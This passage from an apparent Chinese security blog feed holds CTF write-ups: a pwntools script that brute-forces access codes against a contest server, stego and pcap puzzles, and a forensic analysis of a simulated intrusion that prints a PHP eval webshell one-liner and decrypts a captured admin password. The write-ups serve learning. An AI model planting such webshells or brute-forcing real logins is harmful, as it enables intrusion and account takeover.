class="number">9</span>) * <span class="number">1000000</span> + code</span><br><span class="line"></span><br><span class="line"><span class="comment">#store it in the database</span></span><br><span class="line">user_functions.store(user, final)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#if user already exists, fetch access code</span></span><br><span class="line">final = user_functions.get_code(user)</span><br><span class="line"></span><br><span class="line">code = raw_input(<span class="string">"Enter your access code: "</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> code.isdigit():</span><br><span class="line"><span class="keyword">if</span> (int(code) == final):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The flag is "</span> + user_functions.get_flag(user)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Incorrect access code"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The code must be an integer"</span></span><br><span class="line"></span><br><span class="line">code = (raw_input(<span class="string">"\nPlease enter the code: "</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###############################################"</span></span><br></pre></td></tr></table></figure><p>乍一看好像挺复杂的，其实不然，只需要爆破即可，简单分析下</p><p>起始变量<code>count</code> 是由我们输入的<code>user</code>确定的。如果我们每次测试时都提供相同的<code>user</code>，那么最终<code>count</code>变量也都是不变的；而<code>count_</code>变量嘛，虽然不知道到底是什么嘛，但是模<code>1000</code>得到的结果只可能是<code>[0,999]</code>；而<code>code</code>呢？由于<code>code</code>种子<code>xorshift</code>生成的，我们可以根据<code>count_</code>遍历<code>code</code>。只需要稍微改改给的school.py我们就可以暴力跑出答案。</p><p>核心代码其实也就是下面这个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    count_ = i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the seed is always the same</span></span><br><span class="line">    generator = <span class="string">"xorshift"</span></span><br><span class="line">    random.seed(generator)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> user:</span><br><span class="line">        ra = random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">        rb = (ord(ch) * random.randint(<span class="number">1</span>, len(user))) ^ random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">        count += (ra + rb)/<span class="number">2</span></span><br><span class="line">    code = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+count_):</span><br><span class="line">        code = (code + random.randint(<span class="number">1</span>, i) ) % <span class="number">1000000</span></span><br><span class="line">    final = random.randint(<span class="number">1</span>,<span class="number">9</span>) * <span class="number">1000000</span> + code</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">list_code = []</span><br><span class="line">user = <span class="string">'jianghu'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    count_ = i</span><br><span class="line"></span><br><span class="line">    generator = <span class="string">"xorshift"</span></span><br><span class="line">    random.seed(generator)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> user:</span><br><span class="line">        ra = random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">        rb = (ord(ch) * random.randint(<span class="number">1</span>, len(user))) ^ random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line"></span><br><span class="line">        count += (ra + rb)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    code = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+count_):</span><br><span class="line">        code = (code + random.randint(<span class="number">1</span>, i) ) % <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line">    final = random.randint(<span class="number">1</span>,<span class="number">9</span>) * <span class="number">1000000</span> + code</span><br><span class="line">    list_code.append(final)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> list_code</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">'34.216.132.109'</span>,<span class="number">9094</span>)</span><br><span class="line">con.recvuntil(<span class="string">'Enter your name: '</span>)</span><br><span class="line">con.sendline(user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_code:</span><br><span class="line">    text = con.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        con.sendline(str(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> text,i</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="/2018/09/03/Codefest2018-CTF/1535892298309.png" alt="1535892298309"></p><p>最终答案：<code>CodefestCTF{1_s33_y0u_4r3_a_m4n_0f_r4nd0mn3ss}</code></p><h4 id="It’s-Magic"><a href="#It’s-Magic" class="headerlink" title="It’s Magic"></a>It’s Magic</h4><p><strong>problem</strong></p><p>Repair given corrupted file to get the flag.  <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/file/d/10O4w6rtsUiCspM94qdXqvHeTj-4O0RfX/view?usp=sharing" target="_blank" rel="noopener">download file here</a></p><p>下载完毕后，拖到winhex里，拖到尾部发现<code>FFD9</code>，尝试改文件头，发现无效</p><p><img src="/2018/09/03/Codefest2018-CTF/1535879938784.png" alt="1535879938784"></p><p>遂尝试网上搜索在线修复受损图片，找到一个<a href="https://online.officerecovery.com/cn/fix-damaged-photo-file-online/" target="_blank" rel="noopener">工具网站</a></p><p>修复完成后，打开即有flag</p><p><img src="/2018/09/03/Codefest2018-CTF/1535880232974.png" alt="1535880232974"></p><p>最终答案：<code>CodefestCTF{mAgic_byTes}</code></p><h4 id="Hidden-Agenda"><a href="#Hidden-Agenda" class="headerlink" title="Hidden Agenda"></a>Hidden Agenda</h4><p><strong>problem</strong></p><p>Just before getting caught in Russia, MI-6 agent John Stegwal sent a mail to MI-6 containing two <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/drive/folders/1GHCN9eIRPtlMA0xGxnr44nY0boo-6DOx?usp=sharing" target="_blank" rel="noopener">visually similar images</a>. It is possible that the images contain information on how to access his findings. Can you find the message he sent?</p><p>给了两个<code>jpg</code>文件：<code>image1.jpg</code>与<code>image2.jpg</code>。</p><p>先用<code>StegSolve</code>将<code>image1.jpg</code>与<code>image2.jpg</code>来次<code>xor</code>，发现有个二维码的痕迹，保存为<code>solved.bmp</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535769690535.png" alt="1535769690535"></p><p>将<code>solved.bmp</code>与<code>image1.jpg</code>再来一次MUL，得到一个可扫的清晰二维码</p><p><img src="/2018/09/03/Codefest2018-CTF/1535769505500.png" alt="1535769505500"></p><p>扫出来是个网址<code>https://drive.google.com/file/d/13chbULOlKaOM_jI8_RaxECZ0xzJUg7Y4/view</code>，打开后，有张图片，下载下来，打开后可以看到清晰的<code>flag{</code>字样，然后，没然后了，这张图片只有<code>flag{</code>（那时候看到flag，开心极了，贼坑）</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882244230.png" alt="1535882244230"></p><p>没事，我吃柠檬。谷歌了下，找了找有关<code>jpg</code>图片隐写，找到了个<code>jsteg</code>，哟，试试</p><p>先试试<code>image1.jpg</code>，试出东西来了</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882176697.png" alt="1535882176697"></p><p>得到了个<code>flg.exe</code>，<code>winhex</code>看下，没看懂是啥</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882473635.png" alt="1535882473635"></p><p><code>file</code>下，发现是个<code>MP3</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535882547718.png" alt="1535882547718"></p><p>改后缀名，听了听，这是鸟叫声？<code>exm</code>?拖到<code>Adobe Audition CC2017</code>试试，查看了下频谱图</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882938272.png" alt="1535882938272"></p><p>得到最终答案：<code>CodefestCTF{0b5cur17y &gt; 53cur17y}</code></p><h4 id="Thunder"><a href="#Thunder" class="headerlink" title="Thunder"></a>Thunder</h4><p>此题给了个流量包<code>thunder.pcap</code>，包不大，分析发现好几个<code>flag.jpg</code>，但是都是不完整的。</p><p><img src="/2018/09/03/Codefest2018-CTF/1535880958735.png" alt="1535880958735">尝试根据<code>jpg</code>文件的文件格式来拼图。先导出<code>http</code>对象，删除重复的。此题有个坑点，不可以按照分组序号的大小来拼，必须按照<code>TCP</code>流所显示的时间依小到大排序，然后拼好即可。</p><p><img src="/2018/09/03/Codefest2018-CTF/1535773565813.png" alt="1535773565813"></p><p>人懒，写了个<code>bat</code>脚本<code>1.bat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type flag*.jpg&gt;&gt;all.jpg</span><br></pre></td></tr></table></figure><p>以下是<code>all.jpg</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535880779671.png" alt="1535880779671"></p><p>得到最终答案：<code>CodefestCTF{AP_is_amazing}</code></p><h4 id="Polyglot"><a href="#Polyglot" class="headerlink" title="Polyglot"></a>Polyglot</h4><p><strong>problem</strong></p><p>Chetu writes code with weird whitespace, and nobody knows why. He uses his own <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/open?id=12pZCXtDxvGqZUEzaZ-I_3Md-bPizUILT" target="_blank" rel="noopener">C interpreter</a>, which is probably the only thing that can handle his absurd code. He insists its more secure this way. Since no one ever believes him, he demonstrated his technique on <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/open?id=17ORWMNSOodeEarjuYDXHswlC_6t_kH_A" target="_blank" rel="noopener">this vulnerable code</a>.  Can you get the flag?</p><p>这题贼有意思，贼好玩。题目给了两个文件，但是做这题，我只用了<code>c</code>代码的文件，另外一个<code>elf</code>都没看。</p><p>首先我们看看<code>c</code>代码：</p><p><img src="/2018/09/03/Codefest2018-CTF/1535893121359.png" alt="1535893121359"></p><p>会发现，这些数字排序，怎么都是空那么多格子的呢？奇怪，但是突然想起了写<code>python</code>脚本时，会因为空格和<code>tab</code>混淆而报错，下意识看看这些空白字符是由什么构成的。<code>Notepad++</code>有个功能</p><p><img src="/2018/09/03/Codefest2018-CTF/1535893522278.png" alt="1535893522278"></p><p>果然，这些空白字符是由不同的空格字符和制表符组成。尝试先用脚本读读</p><p><img src="/2018/09/03/Codefest2018-CTF/1535894260379.png" alt="1535894260379"></p><p>果然，猜想是正确的，那么现在需要提取下这些空白的字符。想到了正则表达式，其中<code>\s</code>表示只要出现空白就匹配。但是匹配完后有什么用了？随即想到有没可能是<code>0</code>,<code>1</code>替换，到时候来个二进制转换<code>ASCII</code>可见字符。尝试一波，先匹配试试，然后<code>‘\t’</code>替换成<code>1</code>，<code>‘ ’</code>替换成<code>0</code>，得到了想要的答案</p><p><img src="/2018/09/03/Codefest2018-CTF/1535894689021.png" alt="1535894689021"></p><p>最终答案：<code>CodefestCTF{sP4c3S AnD\tAb5}</code></p><h4 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h4><p><strong>problem</strong></p><p>Garry encrypted a message with his public key and mailed it to Monika. Sure Garry is an idiot. The intercepted mail is given below as seen from Monika’s side. Decrypt the message to get the key.  <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/file/d/1T9mCsfp-QZFnas6scLSUx7cg9yYmT8hH/view?usp=sharing" target="_blank" rel="noopener">interceptedMail.eml</a></p><p>下载文件后，发现<code>eml</code>中存在<code>zip</code>，<code>base64</code>解码下</p><p><img src="/2018/09/03/Codefest2018-CTF/1535897369171.png" alt="1535897369171"></p><p>有两个文件，<code>flag.enc</code>是密文，但是私钥哪去了呢？其实在下面那个文件里。</p><p><img src="/2018/09/03/Codefest2018-CTF/1535895884842.png" alt="1535895884842"></p><p>其中<code>Public_Key_Encryption_.docx</code>实际上是是个压缩包，<code>winhex</code>下看到了<code>PK</code>的头</p><p><img src="/2018/09/03/Codefest2018-CTF/1535895863184.png" alt="1535895863184"></p><p>改后缀名，解压。寻找一番没找到私钥。最后才发现，在解压文件中<code>word\media\</code>，存在三张图片</p><p><img src="/2018/09/03/Codefest2018-CTF/1535896502425.png" alt="1535896502425"></p><p>其中的<code>image1.png</code>的尾部存在私钥<img src="/2018/09/03/Codefest2018-CTF/1535896553352.png" alt="1535896553352"></p><p>那么，提取出来，保存为<code>private.pem</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535897514713.png" alt="1535897514713"></p><p>额，<code>openssl</code>解密下，执行命令<code>openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txt</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535897143197.png" alt="1535897143197"></p><p>最终答案：<code>CodefestCTF{kristeinStewart_is_5EXY}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实在是太无聊了，找了找比赛打，Codefest2018这个感觉跟以往的ctf比赛不同，感觉更偏向代码能力的考查，以下是这次自己做出来的题目writeup，菜鸡一枚。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>一次网络流量分析引发的思考</title>
    <link href="https://jianghuxia.github.io/2018/08/31/%E4%B8%80%E6%AC%A1%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%BC%95%E8%B5%B7%E7%9A%84%E5%88%86%E6%9E%90/"/>
    <id>https://jianghuxia.github.io/2018/08/31/一次网络流量分析引起的分析/</id>
    <published>2018-08-31T10:34:39.000Z</published>
    <updated>2018-10-23T10:13:12.993Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>闲来无事，做了做最近安恒<code>8</code>月比赛的流量包，发现有些题目给的分析不够详细。本着学习知识的心态，重新梳理下思路，稍加扩展，再引申谈谈个人对网络流量取证方面的一些见解。</p><a id="more"></a> <h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>详细的比赛题目和分析详见<a href="https://jianghuxia.github.io/2018/08/26/%E5%AE%89%E6%81%92%E5%85%AB%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%8C%85writeup/">这个网站</a>（此处建议详细看看，最好数据包自行下载分析一遍），下面介绍下题目背景，再挑出几道题目深度分析下。</p><h5 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h5><p>某公司内网网络被黑客渗透，黑客首先攻击了一台<code>web</code>服务器，破解了后台的账户的密码，随之利用破解的密码登录了<code>mail</code>系统，然后获取了<code>vpn</code>的申请方式，然后登录<code>vpn</code>，在内网<code>pwn</code>掉一台打印机。</p><h5 id="题目线索总分析"><a href="#题目线索总分析" class="headerlink" title="题目线索总分析"></a>题目线索总分析</h5><p>根据题目背景，我们把握下总体脉络，顺着黑客的思路走一番：</p><p>首先，黑客攻击公司的一台<code>web</code>服务器。走的是以<code>tcp</code>为载体的<code>http</code>请求，所以过滤<code>http</code>数据分组，成为解题最基本的分析思路。</p><p>接着，黑客破解了后台的账户的密码，随之利用破解的密码登录了<code>mail</code>系统。通过这点，我们追踪<code>http</code>，发现更多的线索，比如黑客破解的是哪个账号的哪个密码、登录了<code>mail</code>系统后获取的<code>vpn</code>是什么等等内容。</p><p>最后，黑客获取了<code>vpn</code>的申请方式，然后登录<code>vpn</code>，在内网<code>pwn</code>掉一台打印机。至此，黑客登录了<code>vpn</code>，那么是否通过分析此时的流量推出黑客登录时所用的<code>ip</code>，亦或者其他信息呢？</p><p>至此，基本脉络分析完毕。当然，以上脉络在没有具体分析数据包前，都只是靠推测去模拟出黑客的种种行为，具体如何分析才是最值得深究的一块。这时，可能又会有人问到，黑客就一定按照你想的去做吗？请注意，凡事没有证据（流量包）之前，我们都不能确定事情的真相如何，分析前的推测更多地是指引我们可以从什么角度去分析，而不是说黑客按照我们怎么想的去怎么做。推测不一定都成立，同样，成立的不一定是推测，推测更多的是给我们一个取证的方向。这也正是数据包取证分析的有趣之处，处处悬疑，步步惊心，但真相出来之际，又有恍然大悟之感的喜悦之情。</p><h4 id="迷之坑点"><a href="#迷之坑点" class="headerlink" title="迷之坑点"></a>迷之坑点</h4><h5 id="疯狂踩坑—tcp重传机制"><a href="#疯狂踩坑—tcp重传机制" class="headerlink" title="疯狂踩坑—tcp重传机制"></a>疯狂踩坑—tcp重传机制</h5><p><code>4、某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</code></p><p>这个问题，比赛时，死活找不到答案，但是在浏览<code>webone.pcap</code>数据包的末尾，发现<code>a.php</code>里面有<code>1234</code>为传递值，自己构造了个一句话木马：&lt;?php @eval($_POST[1234]);?&gt;，然后base64提交完成的。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535690664219.png" alt="1535690664219"></p><p>当然，得到了此题比赛的分数，但是，不是为了比赛而做题，而是通过以赛督学。比赛结束后，细细分析，上传<code>shell</code>需要提交<code>POST</code>的请求，于是<code>http</code>的<code>POST</code>请求包浏览一遍，发现目录为<code>/admin/article.php?rec=update</code>的请求页面非常可疑，但是，却始终没有找到含有一句话木马的上传页面？怎么办呢?苦苦思想，咦，有没可能<code>tcp</code>这个载体漏传了，造成了包丢失？随后，过滤语句<code>tcp contains &quot;&lt;?php @eval&quot;</code>一试，终于找到了正确答案，再试<code>http contains &quot;&lt;?php @eval&quot;</code>依旧没找到，十有八九是丢包了，但这到底是为什么，还需进一步分析。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535282630426.png" alt="1535282630426"></p><p>随后我追踪了下<code>tcp</code>流，找到了没在<code>http</code>流中一句话木马上传的页面。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535690893424.png" alt="1535690893424"></p><p>仔细分析了下这个<code>tcp</code>流的来往，我想我找到了真相。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535690519402.png" alt="1535690519402"></p><p>首先，看看上图的<code>733791</code>序号分组，我们可以看到<code>&quot;TCP Previous segment not captured&quot;</code>，提示“存在没有抓到的数据包”，也就是意味着：在当前包的捕获中，缺少了本应出现的某些包。紧接着<code>733793</code>序号分组，<code>&quot;Tcp Retransmission&quot;</code>,提示“<code>Tcp</code>包重传”。很明显，存在了丢包，引发了<code>TCP</code>的重传机制。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535693859074.png" alt="1535693859074"></p><p>随后我寻找了下tcp重传的相关文档<a href="https://tools.ietf.org/html/rfc2001" target="_blank" rel="noopener">rfc2001</a>，该文档是描述<code>TCP</code>慢启动，避免拥塞，快速重传和快速恢复算法相关机制的文档。其中快速重传有这么一句描述</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535692779265.png" alt="1535692779265"></p><p>翻译下：<code>“当收到一个出问题的分组，Tcp立即产生一个应答。这个相同的ack不会延迟。这个相同应答的意图是让对端知道一个分组被收到的时候出现问题，并且告诉它希望得到的序列号。”</code></p><p>那么接下来的<code>733794</code>序号分组，<code>&quot;Tcp Dup ACK 733789#1&quot;</code>，这就代表着，继<code>733789</code>分组序列号后，提示重新传输因某些原因导致的丢包数据。于是，<code>733801</code>序号分组，开始重新传输这段数据。当然，我们可以通过每个分组后面的<code>Seq</code>值，验证是否是重传包。</p><p>比如：<code>733794</code>序号分组，此时的<code>Seq</code>值为<code>1</code>，Ack值为<code>3606</code>（与<code>733789</code>序列号相当）；<code>733801</code>序号分组，此时的<code>Seq</code>值为<code>3606</code>，<code>Ack</code>值为<code>1</code>，<code>len</code>值为<code>1460</code>；<code>733802</code>序号分组，此时的<code>Seq</code>值为<code>1</code>，<code>Ack</code>值为<code>5066</code>（<code>733805</code>序号分组<code>Seq</code>和<code>Ack</code>值刚好与此相反）；通过验算，<code>3606+1460=5066</code>，至此，完全符合重传后每个包的<code>Seq</code>、<code>Ack</code>对应值。这样，我们成功了解决的了这题的疑问，上传的是文本内容为&lt;?php @eval($_POST[1234]);?&gt;的<code>1.php</code>文件。</p><h5 id="疯狂踩坑—社工？还是溯源？"><a href="#疯狂踩坑—社工？还是溯源？" class="headerlink" title="疯狂踩坑—社工？还是溯源？"></a>疯狂踩坑—社工？还是溯源？</h5><p>10、黑客使用了什么账号登陆了<code>mail</code>系统（形式: <code>username/password</code>）</p><p>此题说来有趣，此题答案跟原关卡<code>3</code>答案相同，说解法是社工（我想跟大佬们学下怎么社工），但是对比了下，两个关卡中所用到的数据包给的源服务器<code>ip</code>并不一样。当然，管他白猫黑猫，抓到老鼠就是好猫，比赛时能做出来的确厉害。比赛完后的题目说了“利用破解的密码登录了<code>mail</code>系统”，好吧，这个我也勉强能够接受。以下的内容是根据请教<strong>三斤鱼</strong>大佬，赛后复现出来的，在此再次谢过。</p><p>这题需要看<code>mailtwo.pcap</code>和<code>mailtwo1.pcap</code>两个数据包。</p><p>首先在<code>mailtwo.pcap</code>中过滤<code>http</code>，分组序号<code>3</code>的<code>Cookie</code>中就发现 <code>login_name=wenwenni</code>字段，并且是<code>action=logout</code>。<img src="/2018/08/31/一次网络流量分析引起的分析/1535267557510.png" alt="1535267557510"></p><p>继续观察数据包，发现分组序号<code>28</code>的<code>Get</code>登录请求，再看看分组序号<code>35</code>的响应，猜测系统是通过验证cookies信息允许其免密登录，并在其中发现了输入密码后的加密函数：</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535268095509.png" alt="1535268095509"></p><p>取出来发现是<code>AES</code>的<code>CBC</code>加密，填充格式为<code>ZeroPadding</code>，密钥为字符串<code>1234567812345678</code>的<code>hash</code>值，偏移量为<code>1234567812345678</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(key_hash);</span><br><span class="line"><span class="keyword">var</span> iv  = CryptoJS.enc.Utf8.parse(<span class="string">'1234567812345678'</span>);</span><br><span class="line"> form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; <span class="attr">iv</span>: iv,<span class="attr">mode</span>:CryptoJS.mode.CBC,<span class="attr">padding</span>:CryptoJS.pad.ZeroPadding&#125;);</span><br></pre></td></tr></table></figure><p>在下一分组序号<code>42</code>请求对应的分组序号<code>45</code>返回的响应报文中出现<code>{&quot;success&quot;:true}</code>，表示登陆成功。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535268433463.png" alt="1535268433463"></p><p>既然如此，我们使用<code>(http contains &quot;{\&quot;success\&quot;:true}&quot; or http.request.method==&quot;POST&quot;) and ip.addr==192.168.94.59</code>过滤一下，显示出<code>post</code>请求及成功的返回结果，浏览一下发现是在爆破，并且到<code>mailtwo.pcap</code>的最后也未爆破成功。相同的过滤条件上在<code>mailtwo1.pcap</code>上试试，发现几条数据，从后往前看，发现分组序号<code>18152</code>是登陆成功的返回结果，那对应的分组序号<code>17126</code>则就是正确的加密后的密码。这里可能会有疑问，黑客不是能成功登录<code>wenwenni</code>用户嘛，为啥还要爆破<code>admin</code>用户？(⊙o⊙)…，说个实在话，那个时候我也有这个疑问，不过后面想想，咱们自己渗透的时候不也是习惯先注册一个账号登录玩玩嘛？</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535269130976.png" alt="1535269130976"></p><p>那么<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">解密网址</a>进行<code>aes</code>解密即可得到<code>admin</code>账号的密码。此题最终答案即为：<code>admin/admin!@#PASS123</code></p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535267206637.png" alt="1535267206637"></p><h5 id="疯狂踩坑—vpn流量分析学习"><a href="#疯狂踩坑—vpn流量分析学习" class="headerlink" title="疯狂踩坑—vpn流量分析学习"></a>疯狂踩坑—vpn流量分析学习</h5><p><code>11、某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn,ip是多少</code></p><p>此题答案，额，也不知道算不算不难，额，比赛时，给的两个<code>vpn</code>的数据包，其中<code>ip</code>没几个，一个一个去试，也就出来答案了。下面讲讲自己的做法。</p><p>首先，放出个<a href="https://blog.csdn.net/zhaqiwen/article/details/10083025" target="_blank" rel="noopener">PPTP 理解以及报文的分析</a>学习下先，磨刀不误砍柴工嘛。看懂数据包是分析流量包的第一步。打开<code>vpn.one</code>数据包，之前对<code>vpn</code>的数据包没啥研究，不过借此机会好好学习一番。按照正常的分析流程，<code>wireshark</code>三板斧分析一番。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535701649090.png" alt="1535701649090"></p><p>可以发现<code>GRE</code>、<code>UDP</code>、<code>TCP</code>中三者中，<code>GRE</code>在整个传输层所占比例最大。<code>GRE</code>，<code>Generic Routing Encapsulation</code>，中文名为<strong>通用路由封装协议</strong>，是<code>VPN</code>（<code>Virtual Private Network</code>）的第三层隧道协议。再看图分析，<code>GRE</code>封装着<code>PPP</code>（<code>Point-to-Point Protocol</code>点到点协议），相应的学习链接放置文章末尾（两个协议所在哪一层要先了解）。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535702884388.png" alt="1535702884388"></p><p>其次我们再看看对话，可以清晰的发现，<code>192.168.32.131</code>是基本上每个对话都用到了，可以锁定这条<code>ip</code>地址。并且，我们还发现对话中，<code>192.168.32.255</code>和<code>192.168.94.59</code>两个ip与<code>192.168.32.131</code>对话都很多，那么就很明显，忽略网关后，那就只剩<code>192.168.94.59</code>这个ip了。</p><p>在此分析过程中，我们会遇到其他的“干扰选项”，这些都需要自行筛选分析，比如上图的<code>209.244.0.3</code>与<code>192.168.32.131</code>的对话就如下，一看就知道是无关信息咯。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535703395820.png" alt="1535703395820"></p><p>知道可疑ip后，过滤下，过滤语句<code>ip.addr == 192.168.94.59</code></p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535703698549.png" alt="1535703698549"></p><p>过滤后，映入眼帘的pptp首个分组序号<code>4527</code>：<code>start-control-connection-reply</code> ，这个消息是由PPTP服务器发出，回应<code>start-controlconnection-request</code>消息。那就有点奇怪了，这条消息是回应的，那请求的去哪了？不知道你是否发现分组序号<code>4527</code>前几个分组的消息，没错，正如你所想的，又发生了丢包情况。那我们往下滑，看看完整的分组。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535704979291.png" alt="1535704979291"></p><p>很清晰，<code>192.168.94.59</code>和<code>192.168.32.131</code>通过三次握手时，出现了分组序号<code>4581</code>：<code>start-control-connection-request</code> ，这是由PPTP客户端发出，请求建立控制连接。PPTP隧道要求在发送任何其他PPTP消息之前，先建立一条控制连接。那么很好，可以确定，黑客此时的<code>ip</code>是<code>192.168.94.59</code>。</p><p>再回看题目，黑客获得的<code>vpn</code>,<code>ip</code>是多少？难道是这个？不，天真了。问的应该是分配<code>vpn</code>的<code>ip</code>。接着往下分析，发现了黑客登录vpn时失败的消息：<code>Authentication failed</code>。</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535705605064.png" alt="1535705605064"></p><p>再往下翻翻，不久，你就会发现</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535705793769.png" alt="1535705793769"></p><p>黑客登录成功了，登录的用户名为<code>xiangh</code>，额，做到这里，其实我想知道<code>vpn</code>的密码，后面发现还是天真了，大佬们具体可以参照下<a href="https://blog.csdn.net/cuipengchong/article/details/17248385" target="_blank" rel="noopener">CHAP验证中的密码问题</a>。再接着，通过网站寻找资料学习了一波，发现文档<a href="https://tools.ietf.org/html/rfc1332" target="_blank" rel="noopener">rfc1332</a>有以下描述：</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535706575546.png" alt="1535706575546"></p><p>又发现<a 